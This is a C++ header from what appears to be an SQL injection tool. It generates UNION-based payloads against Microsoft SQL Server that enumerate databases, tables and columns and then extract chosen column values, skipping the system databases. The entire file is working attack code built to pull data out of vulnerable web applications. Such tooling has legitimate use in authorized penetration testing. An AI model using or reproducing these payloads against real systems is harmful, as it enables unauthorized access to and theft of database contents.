#ifndef SQLI_MICROSOFTSQL
#define SQLI_MICROSOFTSQL

#include "sqli_mysql.hpp"

struct sqli_microsoftsql
{
        inline static const str_vector _excluded = {
            "master",
            "msdb",
            "model",
            "tempdb",
        };

        // =========================================== UNION BASED PAYLOADS
        static std::string union_based_db_payload(const sptr_vector params)
        {
                const std::string offset = *params[0];
                *params[0] += "null, ";
                return "' UNION SELECT " + offset + "name " +
                       "FROM sys.databases-- ";
        };

        static std::string union_based_tab_payload(const sptr_vector params)
        {
                return "' UNION SELECT " + *params[0] + "TABLE_NAME " +
                       "FROM " + *params[1] + ".INFORMATION_SCHEMA.TABLES-- ";
        };

        static std::string union_based_col_payload(const sptr_vector params)
        {
                return "' UNION SELECT " + *params[1] + "COLUMN_NAME " +
                       "FROM " + *params[2] + ".INFORMATION_SCHEMA.COLUMNS " +
                       "WHERE TABLE_NAME='" + *params[0] + "'-- ";
        };

        static std::string union_based_val_payload(const sptr_vector params)
        {
                return "' UNION SELECT " + *params[2] + *params[1] + " " +
                       "FROM " + *params[3] + ".." + *params[0] + "-- ";
        };

        // =========================================== UNION BASED PARSER
        static str_vector union_based_parser(const std::string& response)
        {
                return sqli_mysql::union_based_parser(response);
        };
};
#endif
